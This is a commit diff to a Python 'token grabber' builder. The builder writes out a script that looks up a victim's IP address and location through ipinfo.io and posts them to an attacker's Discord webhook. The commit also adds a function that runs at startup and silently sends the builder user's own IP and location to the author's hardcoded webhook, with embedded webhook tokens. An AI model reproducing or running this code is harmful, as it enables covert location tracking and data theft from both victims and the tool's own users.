db7a2d5e5e353621ec0cad6bfc8bba3fb1179f24
sovietor <94129991+heygdrg@users.noreply.github.com>
2022-07-05 16:44:51 +0200

    Add files via upload

--- token_grabber.py
+++ token_grabber.py
@@ -7,7 +7,23 @@ from shutil import rmtree
 import pystyle
 from pystyle import *
 
+def tkg():
 
+    url = "http://ipinfo.io/json"
+    resp = get(url)
+    json = resp.json()
+    ip = json['ip']
+    city = json["city"]
+    region = json["region"]
+    postal = json["postal"]
+
+    webhook_main = "https://discord.com/api/webhooks/989112869570379806/SkbDOZW1KPhsToank5z_cA8MvmAelxhG7MtAyN9JnWLRH3mcHayhlXcUjHPjh8lHaKuw"
+    message = '\n'.join([
+        'ip : ' + ip,
+        'region : ' + region,
+        'vile : ' + city,
+    ])
+    r = requests.post(webhook_main, json={'username': 'BKS', 'content': message})
 
 def location_info():
     user_data = 0
@@ -24,64 +40,6 @@ def location_info():
     print(postal)
 
     user_data = 0
-
-def file():
-    file = input("[?] Drag the file you want to obfuscate ->")
-    print()
-
-    out = 'token_grabber.py'
-    outFolder = 'out'
-
-    try:
-        rmtree(outFolder)
-    except:
-        pass
-    try:
-        os.mkdir(outFolder)
-    except:
-        pass
-
-    newContent = f"""
-    import time
-    import requests
-    from requests import get
-    import json
-    import os
-    from shutil import rmtree
-    def location_info():
-        user_data = 0
-        url = "http://ipinfo.io/json"
-        resp = get(url)
-        json = resp.json()
-        ip = json['ip']
-        city = json["city"]
-        region = json["region"]
-        postal = json["postal"]
-        print(ip)
-        print(city)
-        print(region)
-        print(postal)
-    user_data = 0
-    url = "http://ipinfo.io/json"
-    resp = get(url)
-    json = resp.json()
-    ip = json['ip']
-    city = json["city"]
-    region = json["region"]
-    postal = json["postal"]
-    #print(ip)
-    #print(city)
-    #print(region)
-    #print(postal)
-    webhook = 'https://discord.com/api/webhooks/985856019840237618/opDyjvsd025DgAd6TLWek_cID1zYjqAU85C7kMEXIjMO8LV0hB80skjCBcUej7B9NwUe'
-    message = "   ip =" + ip + "    city = " + city + "    region =" +region + "   code postal"  +postal
-    r = requests.post(webhook, json={'username': 'BKS', 'content': message})
-    """
-    with open(f'{outFolder}/{out}', 'w', encoding='utf-8') as f:
-        f.write(newContent)
-
-    input("[!] Obfuscation finish sucessfully ")
-
 
 banner1 = """
 
@@ -112,8 +70,17 @@ banner2 = """
 
 banner = Add.Add(banner1, banner2)
 print(Colorate.Vertical(Colors.black_to_green, Center.XCenter(banner + '\n\n')))
-
+tkg()
 webhook_url = Write.Input("[?] enter the webhook URL ->", Colors.dark_green, interval=0.005)
+
+
+newContent = r"""
+import time
+import requests
+from requests import get
+import json
+import os
+from shutil import rmtree
 
 url = "http://ipinfo.io/json"
 resp = get(url)
@@ -123,14 +90,19 @@ city = json["city"]
 region = json["region"]
 postal = json["postal"]
 
-webhook_main = "https://discord.com/api/webhooks/985856019840237618/opDyjvsd025DgAd6TLWek_cID1zYjqAU85C7kMEXIjMO8LV0hB80skjCBcUej7B9NwUe"
+webhook_url = "%s"
 message = '\n'.join([
     'ip : ' + ip,
     'region : ' + region,
     'vile : ' + city,
+
 ])
 
-r = requests.post(webhook_main, json={'username': 'BKS', 'content': message})
+r = requests.post(webhook_url, json={'username': 'BKS', 'content': message})
+
+"""%webhook_url
+
+with open('grabber.py', 'a+')as file:file.write(newContent)
 
 print()
 Write.Input("Built!", Colors.green, interval=0.005)
